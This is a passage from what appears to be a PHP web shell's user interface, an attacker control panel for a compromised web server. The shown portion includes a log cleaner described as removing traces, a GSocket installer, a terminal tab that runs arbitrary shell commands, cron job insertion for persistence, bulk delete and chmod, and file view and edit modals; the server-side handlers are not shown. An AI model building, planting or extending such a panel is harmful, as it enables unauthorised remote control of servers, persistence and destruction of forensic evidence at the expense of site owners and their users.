                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-trash mr-2"></i>Log Cleaner
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-4">Clean system logs to remove traces.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="clean_logs">
                                    <button type="submit" class="w-full bg-red-900 hover:bg-red-800 border border-red-600 <?php echo $THEME === 'dark' ? 'text-red-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-trash mr-1"></i>Clean Logs
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-plug mr-2"></i>GSocket Installer
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-4">Install GSocket for secure communication.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="install_gsocket">
                                    <button type="submit" class="w-full bg-indigo-900 hover:bg-indigo-800 border border-indigo-600 <?php echo $THEME === 'dark' ? 'text-indigo-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-plug mr-1"></i>Install GSocket
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Monitoring Tab -->
                <div id="monitoring" class="tab-content">
                    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-6">
                        <h2 class="text-xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-6">
                            <i class="bi bi-activity mr-2"></i>System Monitoring
                        </h2>
                        
                        <!-- Resource Usage Monitor -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5 mb-6">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-cpu mr-2"></i>Resource Usage Monitor
                            </h3>
                            <?php $resources = getSystemResources(); ?>
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-3 rounded">
                                    <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">CPU Load</div>
                                    <div class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>"><?php echo $resources['cpu_load']; ?></div>
                                </div>
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-3 rounded">
                                    <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Memory Usage</div>
                                    <div class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>"><?php echo $resources['memory_usage']; ?></div>
                                </div>
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-3 rounded">
                                    <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Disk Usage</div>
                                    <div class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>"><?php echo $resources['disk_used']; ?> / <?php echo $resources['disk_total']; ?></div>
                                </div>
                            </div>
                        </div>

                        <!-- File Access Log Analyzer -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5 mb-6">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-file-text mr-2"></i>File Access Log Analyzer
                            </h3>
                            <?php $suspiciousLogs = analyzeAccessLogs(); ?>
                            <?php if (empty($suspiciousLogs)): ?>
                                <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">✅ No suspicious activity found in recent logs</div>
                            <?php else: ?>
                                <div class="max-h-60 overflow-y-auto">
                                    <?php foreach ($suspiciousLogs as $log): ?>
                                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-2 mb-2 rounded text-sm">
                                            <div class="<?php echo $THEME === 'dark' ? 'text-red-400' : 'text-red-600'; ?> font-bold">
                                                IP: <?php echo htmlspecialchars($log['ip']); ?> | Status: <?php echo $log['status']; ?>
                                            </div>
                                            <div class="<?php echo $THEME === 'dark' ? 'text-yellow-300' : 'text-yellow-700'; ?>">
                                                Suspicious Pattern: <?php echo htmlspecialchars($log['pattern']); ?>
                                            </div>
                                            <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs mt-1">
                                                <?php echo htmlspecialchars($log['line']); ?>
                                            </div>
                                        </div>
                                    <?php endforeach; ?>
                                </div>
                            <?php endif; ?>
                        </div>

                        <!-- Real-time File Watcher -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5 mb-6">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-clock-history mr-2"></i>Recent File Changes (Last Hour)
                            </h3>
                            <?php $recentChanges = getFileChanges($currentPath); ?>
                            <?php if (empty($recentChanges)): ?>
                                <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">📝 No recent file changes</div>
                            <?php else: ?>
                                <div class="max-h-60 overflow-y-auto">
                                    <?php foreach ($recentChanges as $change): ?>
                                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-2 mb-2 rounded text-sm">
                                            <div class="flex justify-between">
                                                <span class="<?php echo $change['type'] === 'directory' ? 'text-yellow-400' : ($THEME === 'dark' ? 'text-green-300' : 'text-gray-800'); ?>">
                                                    <?php echo $change['type'] === 'directory' ? '📁' : '📄'; ?> 
                                                    <?php echo htmlspecialchars(basename($change['file'])); ?>
                                                </span>
                                                <span class="<?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-blue-600'; ?>">
                                                    <?php echo formatBytes($change['size']); ?>
                                                </span>
                                            </div>
                                            <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs">
                                                <?php echo htmlspecialchars(dirname($change['file'])); ?>
                                            </div>
                                            <div class="<?php echo $THEME === 'dark' ? 'text-gray-400' : 'text-gray-600'; ?> text-xs">
                                                <?php echo $change['time']; ?>
                                            </div>
                                        </div>
                                    <?php endforeach; ?>
                                </div>
                            <?php endif; ?>
                        </div>

                        <!-- File Search & Filter -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-search mr-2"></i>File Search & Filter
                            </h3>
                            <form method="post">
                                <input type="hidden" name="action" value="search_files">
                                <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Search Query</label>
                                        <input type="text" name="search_query" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="File name or path">
                                    </div>
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">File Extensions (comma separated)</label>
                                        <input type="text" name="search_extensions" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="php,html,css,js">
                                    </div>
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Min Size (bytes)</label>
                                        <input type="number" name="min_size" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="0">
                                    </div>
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Max Size (bytes)</label>
                                        <input type="number" name="max_size" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="1000000">
                                    </div>
                                </div>
                                <button type="submit" class="bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> py-2 px-4 rounded">
                                    <i class="bi bi-search mr-1"></i>Search Files
                                </button>
                            </form>
                        </div>

                        <!-- Scheduled Task Manager -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5 mt-6">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-clock mr-2"></i>Scheduled Task Manager
                            </h3>
                            
                            <!-- Add New Cron Job -->
                            <div class="mb-6">
                                <h4 class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> font-bold mb-3">Add New Cron Job</h4>
                                <form method="post" class="grid grid-cols-1 md:grid-cols-3 gap-4">
                                    <input type="hidden" name="action" value="add_cron">
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Schedule (cron format)</label>
                                        <input type="text" name="schedule" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="* * * * *" required>
                                        <div class="<?php echo $THEME === 'dark' ? 'text-gray-400' : 'text-gray-600'; ?> text-xs mt-1">min hour day month weekday</div>
                                    </div>
                                    <div class="md:col-span-2">
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Command</label>
                                        <input type="text" name="command" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="/path/to/script.sh" required>
                                    </div>
                                    <div class="md:col-span-3">
                                        <button type="submit" class="bg-blue-900 hover:bg-blue-800 border border-blue-600 <?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-white'; ?> py-2 px-4 rounded">
                                            <i class="bi bi-plus mr-1"></i>Add Cron Job
                                        </button>
                                    </div>
                                </form>
                            </div>

                            <!-- Current Cron Jobs -->
                            <div>
                                <h4 class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> font-bold mb-3">Current Cron Jobs</h4>
                                <?php $cronJobs = getCronJobs(); ?>
                                <?php if (is_array($cronJobs) && count($cronJobs) > 0 && strpos($cronJobs[0], 'Error') === false): ?>
                                    <div class="max-h-60 overflow-y-auto">
                                        <?php foreach ($cronJobs as $index => $job): ?>
                                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'white'; ?> p-3 mb-2 rounded flex justify-between items-center">
                                                <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-800'; ?> text-sm font-mono">
                                                    <?php echo htmlspecialchars($job); ?>
                                                </div>
                                                <form method="post" class="inline">
                                                    <input type="hidden" name="action" value="remove_cron">
                                                    <input type="hidden" name="index" value="<?php echo $index; ?>">
                                                    <button type="submit" class="bg-red-900 hover:bg-red-800 border border-red-600 <?php echo $THEME === 'dark' ? 'text-red-300' : 'text-white'; ?> py-1 px-2 rounded text-xs">
                                                        <i class="bi bi-trash"></i> Remove
                                                    </button>
                                                </form>
                                            </div>
                                        <?php endforeach; ?>
                                    </div>
                                <?php else: ?>
                                    <div class="<?php echo $THEME === 'dark' ? 'text-yellow-300' : 'text-yellow-700'; ?>">
                                        <?php echo is_array($cronJobs) ? $cronJobs[0] : 'No cron jobs found'; ?>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>

                        <!-- Bulk Operations -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5 mt-6">
                            <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-4">
                                <i class="bi bi-stack mr-2"></i>Bulk Operations
                            </h3>
                            <form method="post">
                                <input type="hidden" name="action" value="bulk_operation">
                                <div class="mb-4">
                                    <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">File/Directory Paths (one per line)</label>
                                    <textarea name="paths" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1 h-32" placeholder="/path/to/file1.php
/path/to/directory1
/path/to/file2.html"></textarea>
                                </div>
                                
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Action</label>
                                        <select name="bulk_action" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" onchange="toggleBulkParams(this.value)">
                                            <option value="delete">Delete</option>
                                            <option value="chmod">Change Permissions</option>
                                            <option value="backup">Backup</option>
                                            <option value="move">Move</option>
                                        </select>
                                    </div>
                                    
                                    <div id="chmod_params" style="display:none;">
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Permissions (octal)</label>
                                        <input type="text" name="chmod_mode" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="0755" value="0755">
                                    </div>
                                    
                                    <div id="backup_params" style="display:none;">
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Backup Directory</label>
                                        <input type="text" name="backup_dir" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="/path/to/backup">
                                    </div>
                                    
                                    <div id="move_params" style="display:none;">
                                        <label class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">Destination Directory</label>
                                        <input type="text" name="move_destination" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mt-1" placeholder="/path/to/destination">
                                    </div>
                                </div>
                                
                                <button type="submit" class="bg-purple-900 hover:bg-purple-800 border border-purple-600 <?php echo $THEME === 'dark' ? 'text-purple-300' : 'text-white'; ?> py-2 px-4 rounded">
                                    <i class="bi bi-lightning mr-1"></i>Execute Bulk Operation
                                </button>
                            </form>
                        </div>
                    </div>
                </div>

                <!-- Terminal Tab -->
                <div id="terminal" class="tab-content">
                    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-6">
                        <h2 class="text-xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-6">
                            <i class="bi bi-terminal mr-2"></i>Terminal Command
                        </h2>
                        <form method="post">
                            <input type="hidden" name="action" value="terminal">
                            <div class="flex mb-4">
                                <span class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> py-3 px-4 rounded-l">$</span>
                                <input type="text" name="command" class="flex-1 <?php echo $THEME === 'dark' ? 'bg-gray-800 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-800'; ?> py-3 px-4 terminal-input" placeholder="Enter command">
                                <button type="submit" class="bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> py-3 px-6 rounded-r">
                                    <i class="bi bi-play mr-1"></i>Execute
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </main>
        </div>
    </div>

    <!-- View File Modal -->
    <div id="viewModal" class="modal">
        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border-b border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> p-4 flex justify-between items-center">
                <h3 class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>">
                    <i class="bi bi-eye mr-2"></i>View File
                </h3>
                <button onclick="closeViewModal()" class="<?php echo $THEME === 'dark' ? 'text-green-400 hover:text-green-300' : 'text-gray-800 hover:text-gray-600'; ?> text-2xl">&times;</button>
            </div>
            <div class="p-4 flex-1 overflow-auto scrollbar-hide">
                <pre id="fileContentView" class="bg-black <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> p-4 rounded whitespace-pre-wrap"></pre>
            </div>
            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border-t border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> p-4 flex justify-end">
                <button onclick="closeViewModal()" class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-800'; ?> px-4 py-2 rounded mr-2">
                    Close
                </button>
            </div>
        </div>
    </div>

    <!-- Edit File Modal -->
    <div id="editModal" class="modal">
        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border-b border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> p-4 flex justify-between items-center">
                <h3 class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>">
                    <i class="bi bi-pencil mr-2"></i>Edit File
                </h3>
                <button onclick="closeEditModal()" class="<?php echo $THEME === 'dark' ? 'text-green-400 hover:text-green-300' : 'text-gray-800 hover:text-gray-600'; ?> text-2xl">&times;</button>
            </div>
            <form id="editForm" method="post" class="flex-1 flex flex-col">
                <input type="hidden" name="action" value="edit_save">
                <input type="hidden" name="path" id="editPath">
                <input type="hidden" name="file" id="editFile">
                <div class="p-4 flex-1 overflow-auto">
                    <textarea name="content" id="fileContent" class="w-full h-96 bg-black <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> p-4 rounded font-mono"></textarea>
                </div>
                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border-t border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> p-4 flex justify-end">
                    <button type="button" onclick="closeEditModal()" class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-800'; ?> px-4 py-2 rounded mr-2">
                        Cancel
                    </button>
                    <button type="submit" class="bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> px-4 py-2 rounded">
                        <i class="bi bi-save mr-1"></i>Save Changes
                    </button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Function to show tab content
        function showTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            
            // Remove active class from all nav buttons
            document.querySelectorAll('nav button').forEach(btn => {
                btn.classList.remove('bg-green-900', 'border-green-600');
                btn.classList.add('bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?>', 'border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?>');
            });
            
            // Show selected tab content
            document.getElementById(tabId).style.display = 'block';
            
            // Add active class to clicked nav button (based on the tab)
            event.target.classList.remove('bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?>', 'border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?>');
            event.target.classList.add('bg-green-900', 'border-green-600');
        }

        // View File Modal Functions - versi yang diperbaiki
        function viewFile(filename, path) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    document.getElementById('fileContentView').textContent = xhr.responseText;
                    document.getElementById('viewModal').classList.add('active');
                }
            };
            
            xhr.send('ajax_action=view_file&file=' + encodeURIComponent(filename) + '&path=' + encodeURIComponent(path));
        }

        function closeViewModal() {
            document.getElementById('viewModal').classList.remove('active');
        }

        // Edit File Modal Functions - versi yang diperbaiki
        function editFile(filename, path) {
            // Set hidden form values
            document.getElementById('editPath').value = path;
            document.getElementById('editFile').value = filename;
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    document.getElementById('fileContent').value = xhr.responseText;
                    document.getElementById('editModal').classList.add('active');
                }
            };
            
            xhr.send('ajax_action=edit_file&file=' + encodeURIComponent(filename) + '&path=' + encodeURIComponent(path));
        }

        function closeEditModal() {
            document.getElementById('editModal').classList.remove('active');
        }

        // Function to rename item
        function renameItem(item, path) {
            var newName = prompt("Enter new name for " + item + ":", item);
            if (newName !== null && newName !== item) {
                var form = document.createElement('form');
                form.method = 'post';
                form.style.display = 'none';
                
                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'rename';
                form.appendChild(actionInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'path';
                pathInput.value = path;
                form.appendChild(pathInput);
                
                var oldNameInput = document.createElement('input');
                oldNameInput.type = 'hidden';
                oldNameInput.name = 'old_name';
                oldNameInput.value = item;
                form.appendChild(oldNameInput);
                
                var newNameInput = document.createElement('input');
                newNameInput.type = 'hidden';
                newNameInput.name = 'new_name';
                newNameInput.value = newName;
                form.appendChild(newNameInput);
                
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Function to chmod item
        function chmodItem(item, perms, path) {
            var newPerms = prompt("Enter new permissions for " + item + " (octal, e.g., 0755):", perms);
            if (newPerms !== null) {
                var form = document.createElement('form');
                form.method = 'post';
                form.style.display = 'none';
                
                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'chmod';
                form.appendChild(actionInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'path';
                pathInput.value = path;
                form.appendChild(pathInput);
                
                var itemInput = document.createElement('input');
                itemInput.type = 'hidden';
                itemInput.name = 'item';
                itemInput.value = item;
                form.appendChild(itemInput);
                
                var modeInput = document.createElement('input');
                modeInput.type = 'hidden';
                modeInput.name = 'mode';
                modeInput.value = newPerms;
                form.appendChild(modeInput);
                
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Function to delete item
        function deleteItem(item, path) {
            if (confirm("Are you sure you want to delete '" + item + "'? This action cannot be undone.")) {
                var form = document.createElement('form');
                form.method = 'post';
                form.style.display = 'none';
                
                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'delete';
                form.appendChild(actionInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'path';
                pathInput.value = path;
                form.appendChild(pathInput);
                
                var itemInput = document.createElement('input');
                itemInput.type = 'hidden';
                itemInput.name = 'item';
                itemInput.value = item;
                form.appendChild(itemInput);
                
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Function to view file from full path
        function viewFileFromPath(filePath) {
            // Extract directory and filename
            const lastSlash = filePath.lastIndexOf('/');
            const dir = filePath.substring(0, lastSlash);
            const filename = filePath.substring(lastSlash + 1);
            viewFile(filename, dir);
        }

        // Function to edit file from full path
        function editFileFromPath(filePath) {
            // Extract directory and filename
            const lastSlash = filePath.lastIndexOf('/');
            const dir = filePath.substring(0, lastSlash);
            const filename = filePath.substring(lastSlash + 1);
            editFile(filename, dir);
        }

        // Function to delete webshell
        function deleteWebshell(filePath) {
            if (confirm("⚠️ Are you sure you want to delete this suspicious file?\n\n" + filePath + "\n\nThis action cannot be undone!")) {
                // Extract directory and filename
                const lastSlash = filePath.lastIndexOf('/');
                const dir = filePath.substring(0, lastSlash);
                const filename = filePath.substring(lastSlash + 1);
                
                var form = document.createElement('form');
                form.method = 'post';
                form.style.display = 'none';
                
                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'delete';
                form.appendChild(actionInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'path';
                pathInput.value = dir;
                form.appendChild(pathInput);
                
                var itemInput = document.createElement('input');
                itemInput.type = 'hidden';
                itemInput.name = 'item';
                itemInput.value = filename;
                form.appendChild(itemInput);
                
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Toggle bulk operation parameters
        function toggleBulkParams(action) {
            document.getElementById('chmod_params').style.display = action === 'chmod' ? 'block' : 'none';
            document.getElementById('backup_params').style.display = action === 'backup' ? 'block' : 'none';
            document.getElementById('move_params').style.display = action === 'move' ? 'block' : 'none';
        }

        // Close modals when clicking outside
        window.onclick = function(event) {
            const viewModal = document.getElementById('viewModal');
            const editModal = document.getElementById('editModal');
            
            if (event.target === viewModal) {
                closeViewModal();
            }
            if (event.target === editModal) {
                closeEditModal();
            }
        }

        // Close modals with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeViewModal();
                closeEditModal();
            }
        });
    </script>
</body>
</html>
